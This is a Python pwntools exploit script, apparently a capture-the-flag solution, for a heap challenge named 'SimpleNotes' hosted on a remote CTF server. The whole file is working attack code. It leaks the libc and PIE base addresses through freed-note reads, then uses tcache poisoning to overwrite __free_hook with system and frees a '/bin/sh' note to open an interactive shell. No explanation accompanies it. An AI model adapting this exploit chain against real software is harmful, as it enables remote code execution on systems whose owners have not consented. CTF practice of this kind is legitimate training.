from pwn import *

# Load the binary
binary = './SimpleNotes'
elf = ELF(binary)
#context.log_level = 'critical'
libc = ELF("./libc.so.6")
global p

# Start the process (change 'remote' as per your CTF environment)
# Alternatively, for remote exploitation:
p = remote("pwn.1nf1n1ty.team", 32229)

def create_note(note_id, note_size, content):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Enter the id of note: ", str(note_id))
    p.sendlineafter("Enter the size of note: ", str(note_size))
    p.sendafter("Enter the note: ", content)

def delete_note(note_id):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Enter the id of note: ", str(note_id))

def edit_note(note_id, note_size, content):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Enter the id of note: ", str(note_id))
    p.sendlineafter("Enter the size of note: ", str(note_size))
    p.sendafter("Enter the note: ", content)

def read_note(note_id):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Enter the id of note: ", str(note_id))

# Step 1: Create a note
#p = process(binary)

# leaking libc
create_note(0, 0x409, b"A"*0x409)
create_note(1, 0, b"\n")
delete_note(0)
read_note(0)
libc_leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_leaked - 4111520
log.info(f"libc base = {hex(libc.address)}")

#leaking pie
for j in range(2):
  create_note(j, 8, b"A"*8)
for j in range(2):
  delete_note(j)
create_note(j, 0, b"\n")
read_note(1)
leaked_data = u64(p.recvline().strip().ljust(8, b'\x00'))
elf.address = leaked_data - 21463648
log.info(f"elf base = {hex(elf.address)}")

#getting shell
create_note(2, 0x408, b"\n")
create_note(3, 0x408, b"\n")
delete_note(3)
delete_note(2)
edit_note(2, 0x408, p64(libc.sym["__free_hook"]))
create_note(4, 0x408, b"/bin/sh\0")
create_note(5, 0x408, p64(libc.sym["system"]))
delete_note(4)

#gdb.attach(p, """
#init-pwndbg
#""")

p.interactive()
